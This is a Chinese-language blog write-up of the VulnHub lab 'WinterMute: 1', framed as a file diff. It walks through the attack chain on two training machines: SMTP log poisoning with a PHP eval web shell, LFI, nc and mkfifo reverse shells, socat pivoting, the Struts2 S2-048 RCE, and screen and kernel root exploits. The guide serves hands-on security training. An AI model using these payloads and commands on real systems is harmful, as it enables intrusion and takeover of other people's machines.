@@ -1,0 +1,290 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>WinterMute-1 | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="No.12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WinterMute-1">
+<meta property="og:url" content="https://4reexile.github.io/article/WinterMute-1/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="No.12">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-12-02T13:04:01.000Z">
+<meta property="article:modified_time" content="2024-12-31T08:47:20.201Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="漏洞利用">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="横向移动">
+<meta property="article:tag" content="stmp利用">
+<meta property="article:tag" content="端口转发">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/WinterMute-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'WinterMute-1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-31 16:47:20'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">WinterMute-1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-02T13:04:01.000Z" title="Created 2024-12-02 21:04:01">2024-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-12-31T08:47:20.201Z" title="Updated 2024-12-31 16:47:20">2024-12-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/vulnhub%E9%9D%B6%E5%9C%BA/">vulnhub靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.1k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>WinterMute: 1</h1>
+<hr>
+<blockquote>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/wintermute-1,239/">vulnhub靶场-WinterMute: 1</a></p>
+<p>目标: The goal is the get root on both machines.</p>
+<p>要求: Your Kali box should ONLY be on the same virtual network as Straylight.</p>
+<p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+</blockquote>
+<h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2>
+<p>kali: 192.168.56.5</p>
+<p>Straylight: 192.168.56.102</p>
+<p>Neuromancer: 192.168.89</p>
+<h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -A 192.168.56.102</span><br><span class="line"></span><br><span class="line">25/tcp: smtp Postfix smtpd</span><br><span class="line">80/tcp: http Apache httpd 2.4.25 ((Debian))</span><br><span class="line">3000/tcp: Apache Hadoop, 似乎是登录界面</span><br></pre></td></tr></table></figure>
+<p>访问80, 等待图片跳动完毕后弹出来一段对话, 无可用信息; 目录扫描也只是扫描到了<code>/manual</code>目录, 似乎是Apache的详细信息, 也没什么用</p>
+<p>更不要说25端口了, 用来发邮件的</p>
+<p>只能看3000端口, 经过爆破发现是弱密码<code>admin/admin</code>; 进入之后发现是ntop控制面板, 看看有什么有意义的内容</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241126213406.png" alt="image.png"></p>
+<p>发现一些没见过的路径, 甚至还有Redis数据库; 先看看<code>/turing-bolo/</code>路径下有什么</p>
+<p>下拉发现是一个读取文件?的界面, 点击&quot;提交查询&quot;后url变为<code>/turing-bolo/bolo.php?bolo=armitage</code>, 可能存任意文件包含</p>
+<p>如果你提交了case, 可以发现回显界面有三个log, 可以直接从url访问但是没有用, 因为就是其他三个提交项目</p>
+<p>观察url, 发现都没有log后缀, 所以这个地方是限定只能读取.log文件的; 那么还有什么日志可以读取呢, 只能是stmp服务的日志</p>
+<p>搜索<code>Postfix smtpd log location</code>, 可以得到路径<code>/var/log/mail.log</code></p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241126215627.png" alt="image.png"></p>
+<blockquote>
+<p>Postfix log location 也行, 不推荐百度, 实在太烂了</p>
+</blockquote>
+<p>尝试文件包含: <code>/turing-bolo/bolo.php?bolo=../../../../var/log/mail</code>, 可以正常回显</p>
+<p>发现每次访问/发邮件都会被写入日志, 这里就可以写入木马然后包含了</p>
+<h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2>
+<p>我们可以用smtp发邮件, 将发件人或收件人写为木马, 之后在利用LFI漏洞将mail包含到PHP界面, 这样就可以执行木马, 获得shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.56.102 25 </span><br><span class="line"><span class="comment"># 或者 telnet 172.16.2.5 25</span></span><br><span class="line"><span class="comment"># 向服务器标识用户身份</span></span><br><span class="line">HELO Hack</span><br><span class="line"><span class="comment"># 发件人</span></span><br><span class="line">MAIL FROM:<span class="string">&quot;Hack &lt;?=eval(<span class="variable">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line"><span class="comment"># MAIL FROM:&quot;Hack &lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line"><span class="comment"># 收件人</span></span><br><span class="line">RCPT TO:root</span><br><span class="line"><span class="comment"># 开始编辑邮件内容</span></span><br><span class="line">DATA</span><br><span class="line"><span class="comment"># 输入点代表编辑结束</span></span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+<p>然后返回浏览器利用刚才文件包含点进行包含, 需要查看网页源代码才能看到结果</p>
+<blockquote>
+<p>虽然蚁剑在真实渗透中不建议用, 还是用了(因为好看)</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进行文件包含</span><br><span class="line">http://192.168.56.102/turing-bolo/bolo.php?bolo=../../../../var/log/mail</span><br><span class="line"># POST:</span><br><span class="line">cmd=system(ls);</span><br></pre></td></tr></table></figure>
+<p>有nc, 利用nc反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># POST:</span></span><br><span class="line">cmd=system(<span class="string">&#x27;nc 192.168.56.5 6666 -e /bin/bash&#x27;</span>);</span><br><span class="line"><span class="comment"># 利用py打开新bash</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux straylight 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.9.0-6-amd64</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 网络信息 另一个网卡为192.168.89.4</span></span><br><span class="line">ip addr</span><br><span class="line"><span class="comment"># 查看特权文件 可疑文件/bin/screen-4.5.0</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">gcc -v</span><br><span class="line">socat -h</span><br></pre></td></tr></table></figure>
+<h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2>
+<p>直接搜索screen 4.5.0发现存在现成脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127124350.png" alt="image.png"></p>
+<p>将这个脚本放在靶机tmp目录下:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">python3 -m http.server 6789</span><br><span class="line"></span><br><span class="line"><span class="comment"># 靶机</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.56.5:6789/41154.sh</span><br><span class="line"><span class="built_in">chmod</span> +x 41154.sh</span><br><span class="line">./41154.sh</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127124913.png" alt="image.png"></p>
+<p>第一个flag.txt在<code>/root</code>下, 还有一个note.txt文件, 内容如下</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127131809.png" alt="image.png"></p>
+<p>大概意思是部署了waf?但是这个路径<code>/struts2_2.3.15.1-showcase</code>很像是struts2漏洞; 访问web界面发现并不是外网机器的路径, 那就只能是内网机器的界面了</p>
+<h2 id="横向移动"><a class="header-anchor" href="#横向移动">¶</a>横向移动</h2>
+<p>常年用msf会导致神志不清, 我们来用点别的方法</p>
+<p>靶机没有nmap, 我们可以通过ping进行扫描Neuromancer靶机的IP, 为192.168.89.5</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 255);<span class="keyword">do</span> ping -c 1 192.168.89.<span class="variable">$i</span>;<span class="keyword">done</span> | grep <span class="string">&quot;bytes from&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127130624.png" alt="image.png"></p>
+<p>扫描存活端口, 有8009,8080,34483</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 65535); <span class="keyword">do</span> nc -nvz -w 1 192.168.89.5 <span class="variable">$i</span> 2&gt;&amp;1; <span class="keyword">done</span> | grep -v <span class="string">&quot;Connection refused&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127131042.png" alt="image.png"></p>
+<p>部分解释</p>
+<ul>
+<li>-v    显示指令执行过程</li>
+<li>-w    &lt;超时秒数&gt; 设置等待连线的时间</li>
+<li>-z     使用0输入/输出模式, 只在扫描通信端口时使用</li>
+</ul>
+<p>利用端口转发使得kali可以访问内网靶机; 使用socat将Straylight中的相同端口转发到 Neuromancer</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 好像说有TCP4</span></span><br><span class="line">socat TCP-LISTEN:8009,fork,reuseaddr TCP:192.168.89.5:8009 &amp;</span><br><span class="line">socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.89.5:8080 &amp; </span><br><span class="line">socat TCP-LISTEN:34483,fork,reuseaddr TCP:192.168.89.5:34483 &amp;</span><br></pre></td></tr></table></figure>
+<p>此时我们访问Straylight的8080端口就可以访问到Neuromancer的8080端口</p>
+<p>nmap对转发端口进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p8009,8080,34483 192.168.56.102</span><br><span class="line"></span><br><span class="line">8009/tcp ajp13 Apache Jserv (Protocol v1.3)</span><br><span class="line">8080/tcp http Apache Tomcat 9.0.0.M26</span><br><span class="line">34483/tcp ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://192.168.56.102:8080/struts2_2.3.15.1-showcase</code>, 确实是Struts2, 搜索一下有没有可以利用的exp</p>
+<p>搜索引擎搜搜&quot;Struts2 Showcase 漏洞&quot;, 发现是Apache Struts 2.3.x Showcase 远程命令执行(S2-048)</p>
+<p>搜索kali自带的漏洞库</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit Apache Struts 2.3.x Showcase</span><br><span class="line"><span class="comment"># multiple/webapps/42324.py</span></span><br></pre></td></tr></table></figure>
+<p>是一个反弹shell脚本, 使用方法为后面加上网址和要执行的命令, 注意是内网的ip</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action <span class="string">&quot;nc -nv 192.168.89.4 6666&quot;</span></span><br></pre></td></tr></table></figure>
+<p>你先别急着弹, 如果想让Neuromancer靶机反弹shell到kail上，需要在Straylight靶机继续使用socat做端口重定向到kali</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:6666,fork,reuseaddr TCP:192.168.56.5:6666 &amp;</span><br></pre></td></tr></table></figure>
+<p>执行后弹是弹出来了, 但是因为不支持<code>nc -e</code>功能导致部分shell命令无法使用</p>
+<blockquote>
+<p>你说的对, 我是测试的命令一个没成功, 就是输入没有任何显示</p>
+</blockquote>
+<p>那怎么办, 那就换一个反向shell吧</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> /tmp/f; <span class="built_in">mkfifo</span> /tmp/f; <span class="built_in">cat</span> /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.89.4 7777 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<p>简单的解释:</p>
+<ul>
+<li>当命令序列执行时, <code>cat</code>命令会阻塞并等待<code>/tmp/f</code>管道中的数据</li>
+<li><code>nc</code>命令会尝试连接到远程主机, 并等待连接建立</li>
+<li>一旦连接建立, 远程主机可以发送数据到<code>nc</code>; 这些数据会被写入到<code>/tmp/f</code>管道中</li>
+<li><code>cat</code>命令会读取管道中的数据, 并将其作为输入传递给<code>bash</code></li>
+<li><code>bash</code> shell会处理输入, 并生成输出(包括用户输入的命令的结果)</li>
+<li><code>bash</code>的输出(包括标准输出和标准错误)会被重定向回管道, 但由于管道的另一端已经被<code>nc</code>占用, 这些输出实际上会被<code>nc</code>读取, 并通过TCP连接发送回远程主机</li>
+</ul>
+<p>现在利用方法是: 利用S2-048下载并执行文件, 弹shell到kali</p>
+<p>在kali新建一个hello.sh文件, 将刚才那个反向shell塞进去, 然后开启http服务</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241202200029.png" alt="image.png"></p>
+<blockquote>
+<p>如果你用了其他端口, 重新用socat建一个管道</p>
+</blockquote>
+<p>然后让内网主机下载运行这个文件(运行脚本均在kali)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action <span class="string">&quot;wget http://192.168.89.4:6666/hello.sh -O /tmp/hello.sh&quot;</span></span><br><span class="line"><span class="comment"># 赋权</span></span><br><span class="line">python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action <span class="string">&quot;chmod +x /tmp/hello.sh&quot;</span></span><br></pre></td></tr></table></figure>
+<p>我这里.sh文件写的是7777端口, 要用socat建一个新的管道</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:7777,fork,reuseaddr TCP:192.168.56.5:7777 &amp;</span><br></pre></td></tr></table></figure>
+<p>然后kali监听, 内网主机运行(端口打结导致试了好久):</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">nc -lvnp 7777</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让target运行</span></span><br><span class="line">python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action <span class="string">&quot;sh /tmp/hello.sh&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241202202003.png" alt="image.png"></p>
+<h2 id="信息收集-v3"><a class="header-anchor" href="#信息收集-v3">¶</a>信息收集</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 查看发行版本 Ubuntu 16.04.4 LTS</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment"># 网络信息 192.168.89.5</span></span><br><span class="line">ip addr</span><br><span class="line"><span class="comment"># 查看特权文件 </span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 查看环境, 没有gcc</span></span><br><span class="line">gcc -v</span><br></pre></td></tr></table></figure>
+<h2 id="提权-v2"><a class="header-anchor" href="#提权-v2">¶</a>提权</h2>
+<p>看到 内核版本4.4.0-116-generic的Ubuntu 16.04已经开始笑了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit 4.4.0</span><br><span class="line"><span class="comment"># locate linux/local/44298.c</span></span><br></pre></td></tr></table></figure>
+<p>本地编译后发送到靶机进行提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">gcc 44298.c -static -o 44298</span><br><span class="line"><span class="comment"># target,注意在tmp目录下</span></span><br><span class="line">wget http://192.168.89.4:6666/44298 /tmp/44298</span><br><span class="line"><span class="built_in">chmod</span> +x 44298</span><br><span class="line">./44298</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241202205122.png" alt="image.png"></p>
+<p>现在我们来找找flag(不用想就是在<code>/root</code>目录), 那就是这一串内容了</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241202205809.png" alt="image.png"></p>
+<h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2>
+<p>好奇测试<code>linux/local/45010.c</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.89.4:6666/45010 /tmp/45010</span><br><span class="line"><span class="built_in">chmod</span> +x 45010</span><br><span class="line">./45010</span><br></pre></td></tr></table></figure>
+<p>也是可以正常提权的, 这个关键词为 Ubuntu 16.04</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/WinterMute-1/">https://4reexile.github.io/article/WinterMute-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Linux/">Linux</a><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">漏洞利用</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a><a class="post-meta__tags" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a><a class="post-meta__tags" href="/tags/stmp%E5%88%A9%E7%94%A8/">stmp利用</a><a class="post-meta__tags" href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">端口转发</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/ctfshow-webbasic-jwt/" title="Web入门_jwt"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Web入门_jwt</div></div></a></div><div class="next-post pull-right"><a href="/article/windows-uneedtoknow/" title="Windows前置知识"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">Windows前置知识</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/DerpNStink-1/" title="DerpNStink-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="title">DerpNStink-1</div></div></a></div><div><a href="/article/FristiLeaks-1.3/" title="FristiLeaks-1.3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-01</div><div class="title">FristiLeaks-1.3</div></div></a></div><div><a href="/article/IMF-1/" title="IMF-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-27</div><div class="title">IMF-1</div></div></a></div><div><a href="/article/Jangow-1-01/" title="Jangow-1-01"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-19</div><div class="title">Jangow-1-01</div></div></a></div><div><a href="/article/Lampiao-1/" title="Lampiao-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-18</div><div 